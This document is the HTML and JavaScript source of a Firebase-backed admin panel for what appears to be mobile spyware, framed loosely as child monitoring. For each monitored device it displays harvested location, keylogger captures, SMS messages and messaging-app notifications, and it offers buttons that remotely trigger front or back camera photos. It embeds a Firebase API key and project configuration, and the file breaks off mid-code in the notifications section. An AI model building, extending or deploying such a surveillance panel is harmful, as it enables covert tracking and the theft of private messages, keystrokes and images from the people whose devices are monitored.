<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Admin Dashboard</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        :root {
            --bg-dark: #0d1117;
            --primary-dark: rgba(22, 27, 34, 0.8);
            --secondary-dark: #2a2a2a;
            --accent-blue: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --border-color: rgba(240, 246, 252, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Inter', sans-serif;
            background: #0d1117;
            color: var(--text-primary);
            overflow: hidden;
        }

        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(45deg, #0d1117, #161b22, #010409, #0d1117);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .dashboard-container {
            display: flex;
            height: 100vh;
        }

        /* Sidebar Styles */
        .sidebar {
            width: 300px;
            background: var(--primary-dark);
            backdrop-filter: blur(10px);
            padding: 1.5rem;
            display: flex;
            flex-direction: column;
            border-right: 1px solid var(--border-color);
            transition: transform 0.3s ease-in-out;
            z-index: 1000;
        }
        .sidebar-header {
            margin-bottom: 2rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .sidebar-header h2 {
            color: #fff;
            font-size: 1.5rem;
        }
        .user-list {
            list-style-type: none;
            overflow-y: auto;
            flex-grow: 1;
        }
        .user-list-item {
            padding: 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .user-list-item:hover, .user-list-item.active {
            background-color: var(--accent-blue);
            color: #fff;
        }
        .user-list-item .user-name { font-weight: 600; }
        .user-list-item .device-name { font-size: 0.8rem; opacity: 0.8; }
        .user-list-item .user-id { 
            font-size: 0.85rem; 
            font-weight: 700;
            color: var(--text-primary);
            opacity: 0.9;
            word-break: break-all; 
            margin-top: 6px;
        }

        /* Main Content Styles */
        .main-content {
            flex-grow: 1;
            padding: 2.5rem;
            overflow-y: auto;
            height: 100vh;
        }
        .main-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }
        .main-header h1 { font-size: 2.25rem; color: #fff; }
        #logout-btn {
            background: var(--accent-red);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }

        #details-view { display: none; }
        .category-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .category-btn {
            background-color: var(--secondary-dark);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 1.5rem 1rem;
            border-radius: 12px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
        }
        .category-btn svg {
            width: 32px;
            height: 32px;
            transition: all 0.3s;
        }
        .category-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
            border-color: var(--accent-blue);
        }
        .category-btn.active {
            background-color: var(--accent-blue);
            color: #fff;
            border-color: var(--accent-blue);
        }
        .category-btn.active svg {
            stroke: #fff;
        }
        
        .data-display-area {
            background: var(--primary-dark);
            padding: 2rem;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            min-height: 400px;
        }
        
        .data-header {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--border-color);
            flex-wrap: wrap;
            gap: 1rem;
        }
        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn {
            color: white;
            padding: 8px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .clear-category-btn { background-color: var(--accent-red); }
        .capture-photo-btn { background-color: var(--accent-green); }
        #refresh-photos-btn { background-color: var(--accent-blue); }

        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
        .photo-card {
            background-color: var(--secondary-dark);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        .photo-card img {
            width: 100%;
            height: 180px;
            object-fit: cover;
        }
        .photo-info {
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .photo-time {
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        .view-btn {
            background-color: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 6px;
            width: 36px;
            height: 36px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .map-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 1.5rem;
            padding: 12px 20px;
            background-color: var(--accent-blue);
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: background-color 0.3s;
        }
        .map-link:hover {
            opacity: 0.9;
        }

        #login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-card {
            width: 100%;
            max-width: 400px;
            background: var(--primary-dark);
            backdrop-filter: blur(10px);
            padding: 2.5rem;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .login-card h2 { 
            margin-bottom: 2rem;
            color: #fff;
            font-size: 1.8rem;
        }
        .login-card input {
            background-color: var(--secondary-dark);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            padding: 16px;
            font-size: 1rem;
            transition: border-color 0.3s;
            width: 100%;
            margin-bottom: 1rem;
            border-radius: 8px;
        }
        .login-card input:focus {
            outline: none;
            border-color: var(--accent-blue);
        }
        .login-card button {
             background: var(--accent-blue);
             padding: 16px;
             font-size: 1rem;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             transition: all 0.3s ease;
             width: 100%;
             margin-top: 10px;
             border-radius: 8px;
             border: none;
             cursor: pointer;
             color: white;
             font-weight: 600;
        }
        .login-card button:hover {
            box-shadow: 0 6px 20px rgba(58, 134, 255, 0.3);
            transform: translateY(-2px);
        }
        #error-message { 
            color: var(--accent-red); 
            margin-top: 1rem; 
            font-weight: 500; 
            min-height: 20px;
        }

        .loader {
            border: 4px solid var(--secondary-dark); border-top: 4px solid var(--accent-blue);
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 40px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Updated SMS Bubble Styles */
        .chat-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            padding: 1rem;
        }
        .sms-bubble {
            padding: 10px 15px;
            border-radius: 18px;
            max-width: 75%;
            word-wrap: break-word;
            background-color: var(--secondary-dark); /* Grey for all */
            color: var(--text-primary);
        }
        .sms-bubble.incoming {
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }
        .sms-bubble.outgoing {
            align-self: flex-end;
            border-bottom-right-radius: 4px;
        }
        .sms-body {
            font-size: 0.95rem;
            line-height: 1.5;
        }
        .sms-meta {
            font-size: 0.75rem;
            opacity: 0.7;
            margin-top: 5px;
            text-align: right;
        }
        
        .notification-list { display: flex; flex-direction: column; gap: 1rem; }
        .notification-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
        .notification-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
        .notification-icon { width: 28px; height: 28px; flex-shrink: 0; }
        .notification-icon svg, .notification-icon img { width: 100%; height: 100%; border-radius: 4px; }
        .notification-title { font-weight: 600; color: #fff; }
        .notification-body { font-size: 0.9rem; line-height: 1.5; color: var(--text-primary); }
        .notification-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }

        /* NEW Keylogger Card Styles */
        .keylog-list { display: flex; flex-direction: column; gap: 1rem; }
        .keylog-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
        .keylog-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
        .keylog-icon { width: 24px; height: 24px; flex-shrink: 0; color: var(--accent-orange); }
        .keylog-action { font-weight: 600; color: #fff; }
        .keylog-text { font-size: 0.95rem; line-height: 1.5; color: var(--text-primary); word-break: break-all; }
        .keylog-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
            display: none; justify-content: center; align-items: center;
            z-index: 1001; padding: 20px; box-sizing: border-box;
        }
        .modal-content {
            background: var(--primary-dark);
            border: 1px solid var(--border-color);
            padding: 1.5rem; border-radius: 12px;
            width: 100%; max-width: 900px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            display: flex; flex-direction: column; max-height: 90vh;
        }
        .modal-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color);
        }
        .modal-header h3 { margin: 0; color: #fff; }
        .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
        .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }

        #menu-btn {
            display: none;
            background: none;
            border: none;
            color: var(--text-primary);
            cursor: pointer;
            padding: 0;
            margin: 0;
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 999;
        }
        @media (max-width: 992px) {
            .sidebar {
                position: fixed;
                left: 0;
                top: 0;
                height: 100%;
                transform: translateX(-100%);
            }
            .sidebar.open {
                transform: translateX(0);
            }
            #menu-btn {
                display: block;
            }
            .main-content {
                padding: 1.5rem;
            }
            .category-buttons {
                grid-template-columns: repeat(2, 1fr);
                gap: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="background-animation"></div>

    <div id="login-container">
        <div class="login-card">
            <h2>Admin Panel</h2>
            <input type="email" id="email" placeholder="Admin Email">
            <input type="password" id="password" placeholder="Password">
            <button id="login-btn">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
                <span>Secure Login</span>
            </button>
            <p id="error-message"></p>
        </div>
    </div>

    <div id="dashboard" class="dashboard-container" style="display: none;">
        <aside class="sidebar">
            <div class="sidebar-header">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                <h2>Users</h2>
            </div>
            <ul id="user-list" class="user-list"></ul>
        </aside>

        <main class="main-content">
            <header class="main-header">
                <button id="menu-btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                </button>
                <h1 id="main-content-title">Select a User</h1>
                <button id="logout-btn">Logout</button>
            </header>

            <div id="details-view">
                <div class="category-buttons">
                    <button class="category-btn" data-category="location">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                        <span>Location</span>
                    </button>
                    <button class="category-btn" data-category="photo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                        <span>Photos</span>
                    </button>
                    <button class="category-btn" data-category="keylogger">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                        <span>Keylogger</span>
                    </button>
                    <button class="category-btn" data-category="sms">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                        <span>SMS</span>
                    </button>
                    <button class="category-btn" data-category="notifications">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                        <span>Notifications</span>
                    </button>
                </div>
            </div>
        </main>
    </div>
    <div id="overlay"></div>

    <div id="data-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">Data</h3>
                <button id="modal-close-btn" class="modal-close-btn">&times;</button>
            </div>
            <div class="modal-body" id="modal-data-display-area"></div>
        </div>
    </div>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
        import { getDatabase, ref, onValue, remove, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
        import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";

        // Your NEW Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
          authDomain: "home-demo12-d5814.firebaseapp.com",
          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
          projectId: "home-demo12-d5814",
          storageBucket: "home-demo12-d5814.appspot.com",
          messagingSenderId: "433464727867",
          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
          measurementId: "G-NHHB06Z9HT"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const storage = getStorage(app);

        // The rest of the script remains the same as the original admin.html
        const loginContainer = document.getElementById('login-container');
        const dashboard = document.getElementById('dashboard');
        const userList = document.getElementById('user-list');
        const mainContentTitle = document.getElementById('main-content-title');
        const detailsView = document.getElementById('details-view');
        const categoryButtonsContainer = document.querySelector('.category-buttons');
        const menuBtn = document.getElementById('menu-btn');
        const sidebar = document.querySelector('.sidebar');
        const overlay = document.getElementById('overlay');
        const dataModal = document.getElementById('data-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalDataDisplayArea = document.getElementById('modal-data-display-area');
        const modalCloseBtn = document.getElementById('modal-close-btn');

        let activeDataListener = null;
        let selectedUserInfo = {};

        document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
        document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

        onAuthStateChanged(auth, user => {
            if (user) {
                const adminRef = ref(db, `admins/${user.uid}`);
                onValue(adminRef, (snapshot) => {
                    if (snapshot.exists() && snapshot.val() === true) {
                        loginContainer.style.display = 'none';
                        dashboard.style.display = 'flex';
                        loadUsersIntoSidebar();
                    } else {
                        signOut(auth);
                        alert("Access Denied. You are not an admin.");
                    }
                }, { onlyOnce: true });
            } else {
                loginContainer.style.display = 'flex';
                dashboard.style.display = 'none';
            }
        });
        
        function loadUsersIntoSidebar() {
            const usersRef = ref(db, 'user'); 
            onValue(usersRef, (snapshot) => {
                userList.innerHTML = '';
                const data = snapshot.val();
                if (data) {
                    Object.keys(data).forEach(userId => {
                        const userChildren = data[userId];
                        Object.keys(userChildren).forEach(childKey => {
                            const childData = userChildren[childKey];
                            const userName = childData?.data?.nameChild || childKey;
                            const deviceName = childData?.data?.nameDevice || 'Unknown Device';
                            const listItem = document.createElement('li');
                            listItem.className = 'user-list-item';
                            listItem.dataset.userid = userId;
                            listItem.dataset.childkey = childKey;
                            listItem.dataset.username = userName;
                            listItem.dataset.devicename = deviceName;
                            listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${deviceName}</div><div class="user-id">User: ${userId}</div></div>`;
                            userList.appendChild(listItem);
                        });
                    });
                } else {
                    userList.innerHTML = '<li>No users found.</li>';
                }
            });
        }

        userList.addEventListener('click', (e) => {
            const listItem = e.target.closest('.user-list-item');
            if (listItem) {
                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
                listItem.classList.add('active');
                selectedUserInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
                mainContentTitle.textContent = `${selectedUserInfo.userName} (${selectedUserInfo.deviceName})`;
                detailsView.style.display = 'block';
                
                document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
                if (dataModal.style.display === 'flex') {
                    dataModal.style.display = 'none';
                }

                if (window.innerWidth <= 992) {
                    sidebar.classList.remove('open');
                    overlay.style.display = 'none';
                }
            }
        });

        categoryButtonsContainer.addEventListener('click', (e) => {
            const button = e.target.closest('.category-btn');
            if (button) {
                 document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
                 button.classList.add('active');
                openDataModal(button.dataset.category);
            }
        });

        function openDataModal(category) {
            modalTitle.textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
            dataModal.style.display = 'flex';
            displayCategoryData(category);
        }
        
        function displayCategoryData(category) {
            if (activeDataListener) { activeDataListener(); }
            modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
            const { userId, childKey } = selectedUserInfo;
            if (!userId || !childKey) return;
            if (category === 'photo') {
                renderPhotosFromStorage(userId, childKey);
                return;
            }
            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
            const dataRef = ref(db, dataPath);
            activeDataListener = onValue(dataRef, (snapshot) => {
                try {
                    const data = snapshot.val();
                    renderData(category, data);
                } catch (error) {
                    console.error("Data rendering error:", error);
                    modalDataDisplayArea.innerHTML = `<p>Error displaying data.</p>`;
                }
            });
        }
        
        async function renderPhotosFromStorage(userId, childKey) {
            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
            try {
                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
                const res = await listAll(photoDirRef);
                if (res.items.length === 0) {
                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
                    return;
                }
                
                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
                const photosWithData = await Promise.all(photoPromises);

                let photoGridHTML = '<div class="photo-grid">';
                photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US');
                    photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
                });
                photoGridHTML += '</div>';
                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
            } catch (error) {
                console.error("Error fetching photos:", error);
                modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`;
            }
        }

        function getCategoryPath(category) {
            switch(category) {
                case 'location': return 'location/data';
                case 'photo': return 'photo/data';
                case 'keylogger': return 'keyLogger/data';
                case 'sms': return 'sms/data';
                case 'notifications': return 'notificationsMessages/data';
                default: return '';
            }
        }

        function renderData(category, data) {
            let headerHTML = '';
            let contentHTML = '';
            const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
            
            if (category !== 'location' && hasData) {
                headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
            }

            if (!hasData) {
                contentHTML = '<p>No data available in this category.</p>';
            } else {
                 switch(category) {
                    case 'location':
                        let mapLink = '';
                        if (data.latitude && data.longitude) {
                            mapLink = `<a href="https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                        }
                        contentHTML = `<div class="location-card"><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div class="location-item-content"><strong>Address</strong><span>${data.address || 'N/A'}</span></div></div><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div class="location-item-content"><strong>Time</strong><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
                        break;
                    case 'keylogger':
                        contentHTML = '<div class="keylog-list">';
                        Object.values(data).reverse().forEach(log => {
                            if (log && log.keyText) {
                                const parts = log.keyText.split(' |');
                                const time = parts[0] || '';
                                const action = (parts[1] || 'Action').replace(/[()]/g, '');
                                const text = parts[2] || 'N/A';
                                contentHTML += `
                                    <div class="keylog-card">
                                        <div class="keylog-header">
                                            <div class="keylog-icon">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                                            </div>
                                            <strong class="keylog-action">${action}</strong>
                                        </div>
                                        <p class="keylog-text">${text}</p>
                                        <div class="keylog-footer">${time}</div>
                                    </div>`;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                    case 'sms':
                        contentHTML = '<div class="chat-container">';
                        Object.values(data).reverse().forEach(sms => {
                            if (sms) {
                                const bubbleClass = sms.type === 2 ? 'outgoing' : 'incoming';
                                contentHTML += `<div class="sms-bubble ${bubbleClass}"><div class="sms-body">${sms.smsBody || ''}</div><div class="sms-meta"><span>${sms.dateTime || ''}</span>${bubbleClass === 'incoming' ? `<span> from: ${sms.smsAddress || ''}</span>` : ''}</div></div>`;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                    case 'notifications':
                        contentHTML = '<div class="notification-list">';
                        Object.values(data).reverse().forEach(notif => {
                            if (notif) {
                                let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
                                const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
                                if (fullText.includes('whatsapp')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
                                } else if (fullText.includes('messenger')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
                                } else if (fullText.includes('instagram')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 